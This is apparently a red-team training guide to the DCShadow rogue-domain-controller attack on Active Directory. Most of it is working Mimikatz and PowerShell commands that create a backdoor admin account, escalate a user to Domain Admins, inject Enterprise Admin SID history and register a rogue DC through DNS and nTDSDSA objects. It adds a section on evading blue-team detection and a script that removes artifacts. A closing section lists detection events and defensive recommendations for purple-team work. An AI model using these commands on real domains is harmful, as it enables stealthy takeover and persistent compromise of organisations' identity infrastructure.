# DCShadow Attack Guide - Rogue Domain Controller

## Table of Contents
1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Attack Flow](#attack-flow)
4. [Step-by-Step Instructions](#step-by-step-instructions)
5. [Living Off The Land Techniques](#living-off-the-land-techniques)
6. [Detection Evasion](#detection-evasion)
7. [Troubleshooting](#troubleshooting)
8. [Cleanup](#cleanup)

---

## Overview

### What is DCShadow?

**DCShadow** is an advanced Active Directory attack technique that allows an attacker with Domain Admin privileges to temporarily register a rogue Domain Controller and use it to push malicious changes to Active Directory through replication, rather than through normal LDAP operations.

### Why is DCShadow Powerful?

**Key Advantages:**
- **Bypasses DC Audit Logs**: Changes appear to come from DC replication, not admin actions
- **Minimal Footprint**: No modifications logged on real DCs
- **Flexible**: Can modify any AD attribute, create objects, inject SID history, etc.
- **Stealthy**: Very difficult to detect without baseline DC configuration monitoring

**Attack Capabilities:**
- Create backdoor user accounts
- Add users to privileged groups
- Inject SID history (privilege escalation)
- Modify ACLs
- Create Golden Ticket-ready accounts
- Modify any AD object attribute

### Attack Requirements

This is an **EXTREMELY** advanced technique requiring:
1. **Domain Admin** or equivalent privileges (Enterprise Admin for forest-wide)
2. **Two systems**:
   - **System 1**: Acts as rogue DC (registers with AD)
   - **System 2**: Pushes changes via the rogue DC
3. **Network access** to real DC for replication
4. **Mimikatz** (most reliable method) or deep LDAP/AD knowledge

---

## Prerequisites

### Required Permissions
- **Domain Admin** (SID ending in -512)
- OR **Enterprise Admin** (for forest-wide operations)
- Schema modifications may require Schema Admin

### Required Tools

**Option 1: Mimikatz (Recommended)**
```powershell
# Download Mimikatz (from authorized source in testing environment)
# https://github.com/gentilkiwi/mimikatz

# Verify Mimikatz
.\mimikatz.exe "version" "exit"
```

**Option 2: Native Windows Tools (Complex)**
- LDAP command-line tools (ldifde, ldp.exe)
- PowerShell AD module
- Deep understanding of AD schema

### Network Requirements
- **Port 135** (RPC) - TCP
- **Port 389** (LDAP) - TCP
- **Port 445** (SMB) - TCP
- **Dynamic RPC ports** (49152-65535) - TCP
- Access to real DC for replication

### Domain Requirements
- Active Directory Domain Services running
- At least one functioning DC
- AD replication working properly
- No strict DC authentication policies blocking rogue registration

---

## Attack Flow

```
Phase 1: Preparation
    ↓
1. Verify Domain Admin privileges
2. Identify target DC for replication
3. Choose name for rogue DC (non-existent)
4. Set up two attack systems (or use one system for both roles)

Phase 2: Rogue DC Registration
    ↓
5. Create computer object in "Domain Controllers" OU
6. Set computer attributes to mimic DC:
   - userAccountControl = 532480 (SERVER_TRUST_ACCOUNT)
   - primaryGroupID = 516 (Domain Controllers group)
7. Create nTDSDSA object (DC database configuration)
8. Create DNS records (_ldap, _kerberos SRV records)
9. Create server object in Sites container

Phase 3: Pushing Changes
    ↓
10. Use Mimikatz lsadump::dcshadow to prepare changes
11. Trigger replication from rogue DC
12. Real DC accepts changes as legitimate replication
13. Changes propagate through AD

Phase 4: Cleanup
    ↓
14. Remove rogue DC objects
15. Remove DNS records
16. Clear artifacts
```

---

## Step-by-Step Instructions

### Basic Usage with Mimikatz (Recommended)

#### Example 1: Create Backdoor User Account

**Scenario**: Create a hidden admin user that appears to come from DC replication

```powershell
# On System 1 (Rogue DC) - Run Mimikatz as Admin
mimikatz # privilege::debug
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:backdoor /attribute:userAccountControl /value:512
mimikatz # lsadump::dcshadow /object:backdoor /attribute:unicodePwd /value:"P@ssw0rd123!"
mimikatz # lsadump::dcshadow /object:backdoor /attribute:description /value:"Service Account"

# On System 2 (Push changes) - Run Mimikatz as Admin in DIFFERENT window/system
mimikatz # lsadump::dcshadow /push
```

**What happens:**
1. System 1 registers as temporary DC named (usually your computer name)
2. System 2 triggers replication
3. Real DC accepts "backdoor" user creation as if it came from DC
4. User appears in AD with no admin action logged

#### Example 2: Add User to Domain Admins

```powershell
# System 1
mimikatz # lsadump::dcshadow /object:lowprivuser /attribute:primaryGroupID /value:512

# System 2
mimikatz # lsadump::dcshadow /push
```

**Note:** primaryGroupID 512 = Domain Admins

#### Example 3: SID History Injection

**Most Powerful**: Gives a low-privilege user Enterprise Admin rights without actually adding to group

```powershell
# Get Enterprise Admin SID first
Get-ADGroup "Enterprise Admins" | Select-Object SID
# Output: S-1-5-21-{domain}-519

# System 1 - Inject SID history
mimikatz # lsadump::dcshadow /object:lowprivuser /attribute:sidHistory /value:S-1-5-21-{domain}-519

# System 2 - Push
mimikatz # lsadump::dcshadow /push
```

**Result:** User "lowprivuser" now has Enterprise Admin privileges but group membership shows nothing suspicious!

### Using the Script (Semi-Automated)

```powershell
# Create backdoor user
.\DCShadow-Attack.ps1 -DomainController DC01 `
                      -RogueDCName SHADOW01 `
                      -Action CreateUser `
                      -TargetUser backdoor `
                      -Password "P@ssw0rd123!" `
                      -MimikatzPath "C:\Tools\mimikatz.exe"

# Add user to group
.\DCShadow-Attack.ps1 -DomainController DC01 `
                      -RogueDCName SHADOW01 `
                      -Action AddToGroup `
                      -TargetUser backdoor `
                      -TargetGroup "Domain Admins"

# Modify arbitrary attribute
.\DCShadow-Attack.ps1 -DomainController DC01 `
                      -RogueDCName SHADOW01 `
                      -Action ModifyAttribute `
                      -TargetUser victim `
                      -AttributeName "adminCount" `
                      -AttributeValue "1"
```

---

## Living Off The Land Techniques

### Manual DCShadow (Without Mimikatz)

This is **extremely complex** but shows the underlying mechanics:

#### Step 1: Create Computer Object in Domain Controllers OU

```powershell
# Import AD module
Import-Module ActiveDirectory

# Create computer object
$rogueName = "SHADOW01"
$domainDN = (Get-ADDomain).DistinguishedName

New-ADComputer -Name $rogueName `
               -Path "OU=Domain Controllers,$domainDN" `
               -Enabled $true
```

#### Step 2: Configure Computer as DC

```powershell
# Set required attributes
Set-ADComputer -Identity $rogueName -Replace @{
    "userAccountControl" = 532480  # SERVER_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION
    "primaryGroupID" = 516         # Domain Controllers group
    "servicePrincipalName" = @(
        "E3514235-4B06-11D1-AB04-00C04FC2DCD2/$rogueName/$((Get-ADDomain).DNSRoot)",
        "ldap/$rogueName.$((Get-ADDomain).DNSRoot)/$((Get-ADDomain).DNSRoot)",
        "ldap/$rogueName.$((Get-ADDomain).DNSRoot)",
        "HOST/$rogueName.$((Get-ADDomain).DNSRoot)/$((Get-ADDomain).DNSRoot)",
        "HOST/$rogueName.$((Get-ADDomain).DNSRoot)"
    )
}
```

#### Step 3: Create nTDSDSA Object (DC Database)

This is where it gets very complex. The nTDSDSA object resides in Configuration partition:

```powershell
# WARNING: This is pseudo-code for educational purposes
# Actual implementation requires LDAP DirectoryEntry manipulation

$configDN = (Get-ADRootDSE).configurationNamingContext
$siteName = (Get-ADDomainController).Site
$serverDN = "CN=$rogueName,CN=Servers,CN=$siteName,CN=Sites,$configDN"

# Create Server object
$serverEntry = New-Object DirectoryServices.DirectoryEntry("LDAP://$serverDN")
$serverEntry.Properties["objectClass"].Add("server")
$serverEntry.CommitChanges()

# Create NTDS Settings
$ntdsDN = "CN=NTDS Settings,$serverDN"
$ntdsEntry = $serverEntry.Children.Add("CN=NTDS Settings", "nTDSDSA")
$ntdsEntry.Properties["objectClass"].Add("nTDSDSA")

# Set required NTDS attributes
$dsa_guid = [guid]::NewGuid()
$ntdsEntry.Properties["objectGUID"].Value = $dsa_guid.ToByteArray()
$ntdsEntry.Properties["options"].Value = 1  # NTDSDSA_OPT_IS_GC (Global Catalog)
$ntdsEntry.Properties["invocationId"].Value = [guid]::NewGuid().ToByteArray()

$ntdsEntry.CommitChanges()
```

**Note:** The above is simplified. Real implementation is MUCH more complex, which is why Mimikatz is recommended.

#### Step 4: Create DNS Records

```powershell
# Add SRV records for DC services
$dnsServer = (Get-ADDomain).PDCEmulator
$domain = (Get-ADDomain).DNSRoot
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq "Dhcp" -or $_.PrefixOrigin -eq "Manual" }).IPAddress

# LDAP SRV record
Add-DnsServerResourceRecord -ComputerName $dnsServer `
                             -ZoneName $domain `
                             -Name "_ldap._tcp" `
                             -Srv `
                             -DomainName "$rogueName.$domain" `
                             -Priority 0 `
                             -Weight 100 `
                             -Port 389

# Kerberos SRV record
Add-DnsServerResourceRecord -ComputerName $dnsServer `
                             -ZoneName $domain `
                             -Name "_kerberos._tcp" `
                             -Srv `
                             -DomainName "$rogueName.$domain" `
                             -Priority 0 `
                             -Weight 100 `
                             -Port 88

# A record
Add-DnsServerResourceRecordA -ComputerName $dnsServer `
                              -ZoneName $domain `
                              -Name $rogueName `
                              -IPv4Address $ip
```

#### Step 5: Push Changes via Replication

Once rogue DC is registered, modifications can be pushed:

```powershell
# Use LDAP to modify attributes
# This appears to come from DC replication

$targetUserDN = "CN=backdoor,CN=Users,$domainDN"

# Create LDAP connection
$ldap = New-Object DirectoryServices.DirectoryEntry("LDAP://$targetUserDN")

# Modify attribute
$ldap.Properties["description"].Value = "Backdoor Account"
$ldap.SetInfo()  # This triggers replication

# Trigger replication explicitly
Invoke-Command -ComputerName $realDC -ScriptBlock {
    repadmin /syncall /AdeP
}
```

---

## Detection Evasion

### What Blue Teams Look For

**Common DCShadow Detection Indicators:**
1. **New DC registration**: Event ID 4742 (Computer account changed) on real DC
2. **Unusual replication**: Event ID 4932 (Replication from unknown source)
3. **DNS changes**: New _ldap/_kerberos SRV records
4. **nTDSDSA object creation**: In Configuration partition
5. **Unexpected domain controller enumeration**: `nltest /dclist`

### Evasion Techniques

#### 1. Use Realistic DC Names

```powershell
# BAD: Obviously fake
$rogueName = "HACKDC01"
$rogueName = "PWNED"

# GOOD: Matches naming convention
# If real DCs are DC01, DC02, DC03
$rogueName = "DC04"
$rogueName = "DCBACKUP01"
```

#### 2. Blend with Maintenance Windows

```powershell
# Execute during planned maintenance
# When admins expect replication changes

# Check AD replication schedule
Get-ADReplicationSiteLink -Filter * | Select-Object Name, ReplicationFrequencyInMinutes, Schedule
```

#### 3. Minimize Persistence Time

```powershell
# Register, push changes, cleanup FAST
# Entire attack should take < 5 minutes

# Use automated script for speed
```

#### 4. Use Trusted Sites

```powershell
# Register rogue DC in same site as target DC
# Reduces anomaly detection

$realDC = Get-ADDomainController -Identity DC01
$siteName = $realDC.Site  # Use same site
```

#### 5. Cleanup Thoroughly

```powershell
# Remove ALL artifacts immediately
# - Computer object
# - Server object
# - nTDSDSA object
# - DNS records
# - Connection objects

# See Cleanup section for details
```

---

## Troubleshooting

### Error: "Access Denied" When Creating nTDSDSA

**Cause:** nTDSDSA objects are highly protected

**Solution:**
```powershell
# Ensure you're Domain Admin
whoami /groups | findstr "S-1-5-21-.*-512"

# Check permissions on Configuration container
$configDN = (Get-ADRootDSE).configurationNamingContext
Get-Acl "AD:\$configDN" | Format-List

# Use Mimikatz instead of manual LDAP (much more reliable)
```

### Error: "Replication Sync Failed"

**Cause:** Real DC rejecting replication from rogue DC

**Solution:**
```powershell
# Check replication health first
repadmin /showrepl

# Verify rogue DC properly registered
nltest /dclist:{domain}

# Check DNS records exist
nslookup -type=SRV _ldap._tcp.{domain}
```

### Error: "Object Already Exists"

**Cause:** Previous incomplete DCShadow attack

**Solution:**
```powershell
# Find and remove old rogue DC
$rogueName = "SHADOW01"

# Remove computer
Remove-ADComputer -Identity $rogueName -Confirm:$false

# Remove server object
$configDN = (Get-ADRootDSE).configurationNamingContext
$siteName = "Default-First-Site-Name"
$serverDN = "CN=$rogueName,CN=Servers,CN=$siteName,CN=Sites,$configDN"

# Use ldp.exe or ADSI Edit to manually delete server/nTDSDSA objects
```

### Changes Not Replicating

**Cause:** Replication topology issues

**Solution:**
```powershell
# Force replication
repadmin /syncall /AdeP

# Check replication queue
repadmin /queue

# Verify KCC (Knowledge Consistency Checker) ran
repadmin /kcc

# Check replication links
repadmin /showrepl * /csv | ConvertFrom-Csv | Out-GridView
```

---

## Cleanup

### Complete Artifact Removal

**Critical:** Always clean up DCShadow artifacts to avoid breaking AD replication!

#### Automated Cleanup Script

```powershell
function Remove-DCShadowArtifacts {
    param(
        [string]$RogueDCName,
        [string]$RealDC
    )

    $domain = Get-ADDomain
    $configDN = (Get-ADRootDSE).configurationNamingContext

    Write-Host "[*] Removing DCShadow artifacts for: $RogueDCName"

    # 1. Remove computer object
    try {
        Remove-ADComputer -Identity $RogueDCName -Server $RealDC -Confirm:$false -ErrorAction Stop
        Write-Host "[+] Removed computer object"
    } catch {
        Write-Host "[-] Failed to remove computer: $($_.Exception.Message)"
    }

    # 2. Remove DNS records
    try {
        $dnsServer = $domain.PDCEmulator
        $zoneName = $domain.DNSRoot

        Remove-DnsServerResourceRecord -ComputerName $dnsServer `
                                        -ZoneName $zoneName `
                                        -Name "_ldap._tcp" `
                                        -RRType SRV `
                                        -RecordData "$RogueDCName.$zoneName" `
                                        -Force -ErrorAction SilentlyContinue

        Remove-DnsServerResourceRecord -ComputerName $dnsServer `
                                        -ZoneName $zoneName `
                                        -Name "_kerberos._tcp" `
                                        -RRType SRV `
                                        -RecordData "$RogueDCName.$zoneName" `
                                        -Force -ErrorAction SilentlyContinue

        Remove-DnsServerResourceRecord -ComputerName $dnsServer `
                                        -ZoneName $zoneName `
                                        -Name $RogueDCName `
                                        -RRType A `
                                        -Force -ErrorAction SilentlyContinue

        Write-Host "[+] Removed DNS records"
    } catch {
        Write-Host "[-] Failed to remove DNS records: $($_.Exception.Message)"
    }

    # 3. Remove server object from Sites container
    try {
        $sites = Get-ADReplicationSite -Filter *
        foreach ($site in $sites) {
            $serverDN = "CN=$RogueDCName,CN=Servers,CN=$($site.Name),CN=Sites,$configDN"

            # Check if exists
            try {
                $null = Get-ADObject -Identity $serverDN -Server $RealDC -ErrorAction Stop

                # Remove nTDSDSA first (child object)
                $ntdsDN = "CN=NTDS Settings,$serverDN"
                try {
                    Remove-ADObject -Identity $ntdsDN -Server $RealDC -Recursive -Confirm:$false -ErrorAction Stop
                    Write-Host "[+] Removed nTDSDSA object"
                } catch {
                    Write-Host "[-] nTDSDSA not found or already removed"
                }

                # Remove server object
                Remove-ADObject -Identity $serverDN -Server $RealDC -Recursive -Confirm:$false -ErrorAction Stop
                Write-Host "[+] Removed server object from site: $($site.Name)"

            } catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
                # Server not in this site, continue
            }
        }
    } catch {
        Write-Host "[-] Failed to remove server objects: $($_.Exception.Message)"
    }

    # 4. Clear connection objects (replication links)
    try {
        Get-ADReplicationConnection -Filter "ReplicateFromDirectoryServer -like '*$RogueDCName*'" |
            Remove-ADReplicationConnection -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "[+] Removed replication connections"
    } catch {
        Write-Host "[-] No replication connections to remove"
    }

    # 5. Force KCC to regenerate topology
    try {
        Invoke-Command -ComputerName $RealDC -ScriptBlock {
            repadmin /kcc
        }
        Write-Host "[+] Triggered KCC to regenerate replication topology"
    } catch {
        Write-Host "[-] Could not trigger KCC"
    }

    Write-Host "[+] DCShadow cleanup complete"
}

# Usage
Remove-DCShadowArtifacts -RogueDCName "SHADOW01" -RealDC "DC01"
```

#### Manual Cleanup (ADSI Edit)

If automated cleanup fails:

1. Open **ADSI Edit** (adsiedit.msc)
2. Connect to Configuration partition
3. Navigate: `CN=Sites` → `CN={SiteName}` → `CN=Servers`
4. Find `CN={RogueDCName}`
5. Delete `CN=NTDS Settings` (child object first)
6. Delete `CN={RogueDCName}` (parent object)
7. Navigate to `CN=Computers` → `OU=Domain Controllers`
8. Delete rogue DC computer object
9. Clean DNS records via DNS Manager

---

## Detection Testing

### Expected Event IDs (On Real DC)

**Event ID 4742** (Computer Account Changed)
```
Account Name: SHADOW01
Account Domain: DOMAIN
Changes:
  - userAccountControl: 532480
  - primaryGroupID: 516
```

**Event ID 4932** (Replication from New Source)
```
Replication Event: Synchronization of a replica has begun
Source DC: SHADOW01.domain.local
```

**Directory Service Event 1109** (New Connection Object)
```
The Knowledge Consistency Checker has created a replication connection
for the following writeable directory service.
```

### Purple Team Discussion

After the exercise, discuss:

1. **Did blue team detect rogue DC registration?**
2. **Were DNS changes noticed?**
3. **Did replication anomalies trigger alerts?**
4. **Could they identify the source of AD modifications?**

**Recommendations for Blue Team:**
- **Baseline DC count**: Alert on new DCs
- **Monitor Event ID 4742** for Domain Controllers OU
- **Monitor DNS**: Alert on new _ldap/_kerberos SRV records
- **Track nTDSDSA objects**: Alert on creation
- **Replication monitoring**: Unusual replication sources
- **Configuration partition auditing**: Enable detailed logging
- **Regular DC enumeration**: `nltest /dclist:{domain}` and compare to baseline

---

## References

- [MITRE ATT&CK T1207 - Rogue Domain Controller](https://attack.mitre.org/techniques/T1207/)
- [Mimikatz DCShadow Module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
- [DCShadow Explained - Vincent Le Toux & Benjamin Delpy (Black Hat 2018)](https://www.dcshadow.com/)
- [Detecting DCShadow - Microsoft Defender](https://docs.microsoft.com/en-us/defender-for-identity/dcshadow)

---

**CRITICAL WARNING:**

DCShadow is an EXTREMELY powerful and potentially dangerous technique. Improper use can:
- Break Active Directory replication
- Corrupt AD database
- Cause domain-wide authentication failures
- Require forest recovery from backup

**Only use in authorized testing environments with:**
- Proper authorization
- Tested backup/restore procedures
- Isolated test domain (not production)
- Understanding of consequences

**This is for RED TEAM TRAINING ONLY. Unauthorized use is illegal.**
